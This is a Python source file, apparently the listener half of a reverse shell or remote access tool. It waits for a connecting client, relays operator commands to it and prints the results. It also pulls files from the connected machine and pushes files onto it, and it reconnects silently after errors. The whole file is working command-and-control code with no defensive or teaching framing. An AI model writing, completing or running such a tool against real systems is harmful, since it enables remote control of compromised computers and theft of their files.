import socket, tqdm
from os import path
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer_size = 4096
separator = "|" 
Host = input("[?] Enter host => ") #your server ip
Port = input("[?] Enter port => ") #a port for the connection
s.setblocking(1)
s.bind((Host, int(Port))) 
s.listen()   
conn, addr = s.accept()
print("[+] Connection started , IP : " + str(addr[0]) + ", Port : " + str(addr[1]))
while True:
    try:
        command = input("[?] Enter command > ")

        if command == "quit":
            conn.close()
            s.close()
        elif "open " in command and command[-3:] == "txt":
            conn.send(command.encode("utf-8"))
            recv_output = str(conn.recv(1024).decode())
            print(recv_output)
        elif command[-3:] != "txt" and "open " in command:
            FileName = command[5:]
            conn.send(str("Bytes | " + FileName).encode("utf-8"))
            recv_output = str(conn.recv(1024).decode())
            print(recv_output)
            FileBytes = int(float(recv_output[9:]))
            print(FileBytes)
            conn.send("Download".encode("utf-8"))
            data2 = conn.recv(FileBytes)
            print(data2)
            with open(FileName, "wb") as f:
                f.write(data2)
        elif "download " in command:
            # receive using client socket, not server socket
            conn.send(command.encode())
            received = conn.recv(1024).decode()
            print(received)
            filename, filesize = received.split("|")
            # remove absolute path if there is
            filename = path.basename(filename)
            # convert to integer
            filesize = int(filesize)
    # start receiving the file from the socket
    # and writing to the file stream
            progress = tqdm.tqdm(range(filesize), f"[+] Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
            with open(filename, "wb") as f:
                for _ in progress:
                    # read 1024 bytes from the socket (receive)
                    bytes_read = conn.recv(buffer_size)
                    if not bytes_read:    
                        # nothing is received
                        # file transmitting is done
                        break
                    # write to the file the bytes we just received
                    f.write(bytes_read)
                    # update the progress bar
                    progress.update(len(bytes_read))
            # conn.close()
            # s.close()
            conn.close()
            conn, addr = s.accept()
        elif "upload " in command:
            conn.send(command.encode())
            filename = command[7:]        
            filesize = path.getsize(filename)
            if conn.recv(1024).decode() == "Start":
                conn.send(f"{filename}{separator}{filesize}".encode())
            # received = conn.recv(1024).decode()
            progress = tqdm.tqdm(range(filesize), f"[+] Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
            with open(filename, "rb") as f:
                for _ in progress:
                    # read the bytes from the file
                    bytes_read = f.read(buffer_size)
                    if not bytes_read:
                        # file transmitting is done
                        break
                    # we use sendall to assure transimission in 
                    # busy networks
                    conn.sendall(bytes_read)
                    # update the progress bar
                    progress.update(len(bytes_read))
            conn.close()
            conn, addr = s.accept()
        else:
            conn.send(command.encode('utf-8'))
            recv_output = str(conn.recv(1024).decode()) 
            print(recv_output)
    except ConnectionError as msg:
        print(str(msg) + "\n\n\n\n")
        conn.close()
        conn, addr = s.accept()
        print("[+] Reconnected")
    except FileNotFoundError as msg:
        print(str(msg) + "\n\n\n\n")
        conn.close()
        conn, addr = s.accept()
        print("[+] Reconnected")
    except:
        conn.close()
        conn, addr = s.accept()
        print("[+] Reconnected")